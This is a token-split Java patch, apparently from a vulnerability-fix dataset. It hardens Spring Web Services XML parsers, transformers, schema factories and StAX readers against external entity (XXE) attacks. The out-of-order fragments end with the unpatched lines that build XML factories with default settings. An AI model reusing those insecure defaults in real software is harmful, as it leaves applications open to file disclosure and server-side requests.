")", ";", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "\"", "FEATURE", "'", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "'", "is", "probably", "not", "supported", "by", "\"", "+", "factory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "factory", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "\"", ",", "false", ")", ";", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "\"", "FEATURE", "'", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "'", "is", "probably", "not", "supported", "by", "\"", "+", "factory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "factory", ".", "setFeature", "(", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "nonvalidating", "/", "load", "-", "external", "-", "dtd", "\"", ",", "false", ")", ";", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "\"", "FEATURE", "'", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "nonvalidating", "/", "load", "-", "external", "-", "dtd", "'", "is", "probably", "not", "supported", "by", "\"", "+", "factory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "factory", ".", "setXIncludeAware", "(", "false", ")", ";", "factory", ".", "setExpandEntityReferences", "(", "false", ")", ";", "}", "catch", "(", "Exception", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "\"", "Caught", "\"", "+", "e", ".", "getMessage", "(", ")", "+", "\"", "attempting", "to", "configure", "your", "XML", "parser", ".", "\")", ";", "}", "}", "return", "factory", ";", "}", "}", "@", "@", "-", "22", ",", "12", "+", "22", ",", "11", "@", "@", "*", "<", "p", ">", "Only", "distinguishes", "between", "JAXP", "1", ".", "0", ",", "1", ".", "1", ",", "1", ".", "3", ",", "1", ".", "4", ",", "and", "1", ".", "5", ",", "since", "JAXP", "1", ".", "2", "was", "a", "maintenance", "release", "with", "no", "new", "*", "@", "author", "Greg", "Turnquist", "/", "**", "*", "Constant", "identifying", "JAXP", "1", ".", "5", ".", "*", "/", "public", "static", "final", "int", "JAXP_15", "=", "5", ";", "private", "static", "final", "String", "JAXP_15_CLASS_NAME", "=", "\"", "javax", ".", "xml", ".", "validation", ".", "SchemaFactoryConfigurationError", "\"", ";", "ClassUtils", ".", "forName", "(", "JAXP_15_CLASS_NAME", ",", "classLoader", ")", ";", "jaxpVersion", "=", "JAXP_15", ";", "}", "catch", "(", "ClassNotFoundException", "ex", ")", "{", "try", "{", "ClassUtils", ".", "forName", "(", "JAXP_14_CLASS_NAME", ",", "classLoader", ")", ";", "jaxpVersion", "=", "JAXP_14", ";", "}", "catch", "(", "ClassNotFoundException", "e", ")", "{", "/", "/", "leave", "1", ".", "3", "as", "default", "(", "it", "'", "s", "either", "1", ".", "3", "or", "unknown", ")", "jaxpVersion", "=", "JAXP_13", ";", "}", "*", "@", "see", "#", "JAXP_15", "/", "*", "*", "Copyright", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "xml", ";", "import", "javax", ".", "xml", ".", "stream", ".", "XMLInputFactory", ";", "/", "**", "*", "@", "author", "Greg", "Turnquist", "*", "/", "public", "class", "XMLInputFactoryUtils", "{", "/", "**", "*", "Build", "an", "{", "@", "link", "XMLInputFactory", "}", "and", "set", "properties", "to", "prevent", "external", "entities", "from", "accessing", ".", "*", "*", "@", "see", "XMLInputFactory", "#", "newInstance", "(", ")", "*", "/", "public", "static", "XMLInputFactory", "newInstance", "(", ")", "{", "XMLInputFactory", "factory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "factory", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "false", ")", ";", "factory", ".", "setProperty", "(", "\"", "javax", ".", "xml", ".", "stream", ".", "isSupportingExternalEntities", "\"", ",", "false", ")", ";", "return", "factory", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "57", "@", "@", "/", "*", "*", "Copyright", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "xml", ".", "transform", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactory", ";", "import", "javax", ".", "xml", ".", "transform", ".", "TransformerFactoryConfigurationError", ";", "/", "**", "*", "@", "author", "Greg", "Turnquist", "*", "@", "since", "3", ".", "0", ".", "5", "*", "/", "public", "class", "TransformerFactoryUtils", "{", "/", "**", "*", "Build", "a", "new", "{", "@", "link", "TransformerFactory", "}", "using", "the", "default", "constructor", ".", "*", "/", "public", "static", "TransformerFactory", "newInstance", "(", ")", "{", "return", "defaultSettings", "(", "TransformerFactory", ".", "newInstance", "(", "))", ";", "}", "/", "**", "*", "Build", "an", "{", "@", "link", "TransformerFactory", "}", "and", "prevent", "external", "entities", "from", "accessing", ".", "*", "*", "@", "see", "TransformerFactory", "#", "newInstance", "(", ")", "*", "/", "public", "static", "TransformerFactory", "newInstance", "(", "Class", "<", "?", "extends", "TransformerFactory", ">", "transformerFactoryClass", ")", "{", "try", "{", "return", "defaultSettings", "(", "transformerFactoryClass", ".", "newInstance", "(", "))", ";", "}", "catch", "(", "InstantiationException", "|", "IllegalAccessException", "e", ")", "{", "throw", "new", "TransformerFactoryConfigurationError", "(", "e", ",", "\"", "Could", "not", "instantiate", "TransformerFactory", "[", "\"", "+", "transformerFactoryClass", "+", "\"", "]\"", ");", "}", "}", "/", "**", "*", "Prevent", "external", "entities", "from", "accessing", ".", "*", "/", "private", "static", "TransformerFactory", "defaultSettings", "(", "TransformerFactory", "factory", ")", "{", "factory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "factory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_STYLESHEET", ",", "\"", "\")", ";", "return", "factory", ";", "}", "}", "@", "@", "-", "22", ",", "7", "+", "22", ",", "6", "@", "@", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", "transformerFactoryClass", ")", ";", "return", "transformerFactory", ";", "}", "else", "{", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "return", "transformerFactory", ";", "*", "@", "author", "Greg", "Turnquist", "/", "*", "*", "Copyright", "2005", "-", "2014", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "xml", ".", "validation", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "List", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "transform", ".", "Source", ";", "import", "javax", ".", "xml", ".", "validation", ".", "Schema", ";", "import", "javax", ".", "xml", ".", "validation", ".", "Validator", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXNotRecognizedException", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXNotSupportedException", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXParseException", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "/", "**", "*", "Internal", "class", "that", "uses", "JAXP", "1", ".", "5", "features", "to", "create", "an", "{", "@", "code", "XmlValidator", "}", "with", "settings", "to", "prevent", "*", "external", "entity", "access", ".", "*", "*", "@", "author", "Arjen", "Poutsma", "*", "@", "author", "Greg", "Turnquist", "*", "@", "since", "3", ".", "0", ".", "5", "*", "/", "abstract", "class", "Jaxp15ValidatorFactory", "{", "private", "static", "final", "Log", "log", "=", "LogFactory", ".", "getLog", "(", "Jaxp15ValidatorFactory", ".", "class", ")", ";", "static", "XmlValidator", "createValidator", "(", "Resource", "[", "]", "resources", ",", "String", "schemaLanguage", ")", "throws", "IOException", "{", "try", "{", "Schema", "schema", "=", "SchemaLoaderUtils", ".", "loadSchema", "(", "resources", ",", "schemaLanguage", ")", ";", "return", "new", "Jaxp15Validator", "(", "schema", ")", ";", "}", "catch", "(", "SAXException", "ex", ")", "{", "throw", "new", "XmlValidationException", "(", "\"", "Could", "not", "create", "Schema", ":", "\"", "+", "ex", ".", "getMessage", "(", "),", "ex", ")", ";", "}", "}", "private", "static", "class", "Jaxp15Validator", "implements", "XmlValidator", "{", "private", "Schema", "schema", ";", "public", "Jaxp15Validator", "(", "Schema", "schema", ")", "{", "this", ".", "schema", "=", "schema", ";", "}", "@", "Override", "public", "SAXParseException", "[", "]", "validate", "(", "Source", "source", ")", "throws", "IOException", "{", "return", "validate", "(", "source", ",", "null", ")", ";", "}", "@", "Override", "public", "SAXParseException", "[", "]", "validate", "(", "Source", "source", ",", "ValidationErrorHandler", "errorHandler", ")", "throws", "IOException", "{", "if", "(", "errorHandler", "=", "=", "null", ")", "{", "errorHandler", "=", "new", "DefaultValidationErrorHandler", "(", ");", "}", "Validator", "validator", "=", "schema", ".", "newValidator", "(", ");", "try", "{", "validator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "}", "catch", "(", "SAXNotRecognizedException", "|", "SAXNotSupportedException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", "+", "\"", "property", "not", "supported", "by", "\"", "+", "validator", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "validator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", ",", "\"", "\")", ";", "}", "catch", "(", "SAXNotRecognizedException", "|", "SAXNotSupportedException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", "+", "\"", "property", "not", "supported", "by", "\"", "+", "validator", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "validator", ".", "setErrorHandler", "(", "errorHandler", ")", ";", "try", "{", "validator", ".", "validate", "(", "source", ")", ";", "return", "errorHandler", ".", "getErrors", "(", ");", "}", "catch", "(", "SAXException", "ex", ")", "{", "throw", "new", "XmlValidationException", "(", "\"", "Could", "not", "validate", "source", ":", "\"", "+", "ex", ".", "getMessage", "(", "),", "ex", ")", ";", "}", "}", "}", "/", "**", "{", "@", "code", "ErrorHandler", "}", "implementation", "that", "stores", "errors", "and", "fatal", "errors", "in", "a", "list", ".", "*", "/", "private", "static", "class", "DefaultValidationErrorHandler", "implements", "ValidationErrorHandler", "{", "private", "List", "<", "SAXParseException", ">", "errors", "=", "new", "ArrayList", "<", "SAXParseException", ">", "()", ";", "@", "Override", "public", "SAXParseException", "[", "]", "getErrors", "(", ")", "{", "return", "errors", ".", "toArray", "(", "new", "SAXParseException", "[", "errors", ".", "size", "(", ")]", ");", "}", "@", "Override", "public", "void", "warning", "(", "SAXParseException", "ex", ")", "throws", "SAXException", "{", "}", "@", "Override", "public", "void", "error", "(", "SAXParseException", "ex", ")", "throws", "SAXException", "{", "errors", ".", "add", "(", "ex", ")", ";", "}", "@", "Override", "public", "void", "fatalError", "(", "SAXParseException", "ex", ")", "throws", "SAXException", "{", "errors", ".", "add", "(", "ex", ")", ";", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "61", "@", "@", "/", "*", "*", "Copyright", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "xml", ".", "validation", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "validation", ".", "SchemaFactory", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXNotRecognizedException", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXNotSupportedException", ";", "/", "**", "*", "@", "author", "Greg", "Turnquist", "*", "@", "since", "3", ".", "0", ".", "5", "*", "/", "public", "class", "SchemaFactoryUtils", "{", "private", "static", "final", "Log", "log", "=", "LogFactory", ".", "getLog", "(", "SchemaFactoryUtils", ".", "class", ")", ";", "/", "**", "*", "Build", "a", "{", "@", "link", "SchemaFactory", "}", "and", "set", "properties", "to", "prevent", "external", "entities", "from", "accessing", ".", "*", "*", "@", "see", "SchemaFactory", "#", "newInstance", "(", "String", ")", "*", "/", "public", "static", "SchemaFactory", "newInstance", "(", "String", "schemaLanguage", ")", "{", "SchemaFactory", "schemaFactory", "=", "SchemaFactory", ".", "newInstance", "(", "schemaLanguage", ")", ";", "try", "{", "schemaFactory", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "}", "catch", "(", "SAXNotRecognizedException", "|", "SAXNotSupportedException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", "+", "\"", "property", "not", "supported", "by", "\"", "+", "schemaFactory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "try", "{", "schemaFactory", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", ",", "\"", "file", ",", "jar", ":", "file", "\"", ");", "}", "catch", "(", "SAXNotRecognizedException", "|", "SAXNotSupportedException", "e", ")", "{", "if", "(", "log", ".", "isWarnEnabled", "(", "))", "{", "log", ".", "warn", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", "+", "\"", "property", "not", "supported", "by", "\"", "+", "schemaFactory", ".", "getClass", "(", ").", "getCanonicalName", "(", "))", ";", "}", "}", "return", "schemaFactory", ";", "}", "}", "@", "@", "-", "21", ",", "14", "+", "21", ",", "13", "@", "@", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "org", ".", "xml", ".", "sax", ".", "XMLReader", ";", "XMLReader", "xmlReader", "=", "XMLReaderFactoryUtils", ".", "createXMLReader", "(", ");", "SchemaFactory", "schemaFactory", "=", "SchemaFactoryUtils", ".", "newInstance", "(", "schemaLanguage", ")", ";", "/", "*", "*", "Copyright", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "xml", ".", "validation", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "org", ".", "xml", ".", "sax", ".", "XMLReader", ";", "import", "org", ".", "xml", ".", "sax", ".", "helpers", ".", "XMLReaderFactory", ";", "/", "**", "*", "@", "author", "Greg", "Turnquist", "*", "@", "since", "3", ".", "0", ".", "5", "*", "/", "public", "class", "XMLReaderFactoryUtils", "{", "/", "**", "*", "Build", "a", "{", "@", "link", "XMLReader", "}", "and", "set", "properties", "to", "prevent", "external", "entity", "access", ".", "*", "*", "@", "see", "XMLReaderFactory", "#", "createXMLReader", "(", ")", "*", "/", "public", "static", "XMLReader", "createXMLReader", "(", ")", "throws", "SAXException", "{", "XMLReader", "xmlReader", "=", "XMLReaderFactory", ".", "createXMLReader", "(", ");", "xmlReader", ".", "setFeature", "(", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "disallow", "-", "doctype", "-", "decl", "\"", ",", "true", ")", ";", "xmlReader", ".", "setFeature", "(", "\"", "http", ":", "//", "apache", ".", "org", "/", "xml", "/", "features", "/", "nonvalidating", "/", "load", "-", "external", "-", "dtd", "\"", ",", "false", ")", ";", "xmlReader", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "general", "-", "entities", "\"", ",", "false", ")", ";", "xmlReader", ".", "setFeature", "(", "\"", "http", ":", "//", "xml", ".", "org", "/", "sax", "/", "features", "/", "external", "-", "parameter", "-", "entities", "\"", ",", "false", ")", ";", "return", "xmlReader", ";", "}", "}", "@", "@", "-", "19", ",", "13", "+", "19", ",", "13", "@", "@", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "Assert", ".", "noNullElements", "(", "schemaResources", ",", "\"", "No", "null", "schemaResources", "allowed", "\"", ");", "if", "(", "JaxpVersion", ".", "getJaxpVersion", "(", ")", ">", "=", "JaxpVersion", ".", "JAXP_15", ")", "{", "logger", ".", "trace", "(", "\"", "Creating", "JAXP", "1", ".", "5", "XmlValidator", "\"", ");", "return", "Jaxp15ValidatorFactory", ".", "createValidator", "(", "schemaResources", ",", "schemaLanguage", ")", ";", "}", "else", "if", "(", "JaxpVersion", ".", "getJaxpVersion", "(", ")", ">", "=", "JaxpVersion", ".", "JAXP_13", ")", "{", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "private", "static", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "Document", "document", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ").", "newDocumentBuilder", "(", ").", "newDocument", "(", ");", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "Transformer", "transformer", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ").", "newTransformer", "(", ");", "import", "org", ".", "springframework", ".", "util", ".", "xml", ".", "StaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "XMLInputFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "ResourceSource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "/", "*", "*", "Copyright", "2005", "-", "2010", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "xml", ".", "validation", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "public", "class", "Jaxp15ValidatorFactoryTest", "extends", "AbstractValidatorFactoryTestCase", "{", "@", "Override", "protected", "XmlValidator", "createValidator", "(", "Resource", "[", "]", "schemaResources", ",", "String", "schemaLanguage", ")", "throws", "IOException", "{", "return", "Jaxp15ValidatorFactory", ".", "createValidator", "(", "schemaResources", ",", "schemaLanguage", ")", ";", "}", "}", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "Resource", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "sax", ".", "SaxUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "validation", ".", "XmlValidator", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "import", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLUnit", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "springframework", ".", "xml", ".", "transform", ".", "TransformerFactoryUtils", ";", "import", "org", ".", "springframework", ".", "xml", ".", "DocumentBuilderFactoryUtils", ";", "import", "static", "org", ".", "custommonkey", ".", "xmlunit", ".", "XMLAssert", ".", "*;", "TransformerFactory", "transformerFactory", "=", "TransformerFactoryUtils", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactoryUtils", ".", "newInstance", "(", ");</s>private", "static", "TransformerFactory", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "private", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "factory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "return", "XMLInputFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "MethodParameter", ";", "import", "org", ".", "springframework", ".", "xml", ".", "JaxpVersion", ";", "return", "XMLInputFactory", ".", "newInstance", "(", ");", "return", "XMLInputFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "MethodParameter", ";", "import", "org", ".", "springframework", ".", "ws", ".", "server", ".", "endpoint", ".", "adapter", ".", "method", ".", "AbstractPayloadSourceMethodProcessor", ";", "return", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "transformerFactory", "=", "TransformerFactory", ".", "newInstance", "(", ");", "private", "static", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "XMLInputFactory", "inputFactory", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "import", "org", ".", "springframework", ".", "core", ".", "io", ".", "ClassPathResource", ";", 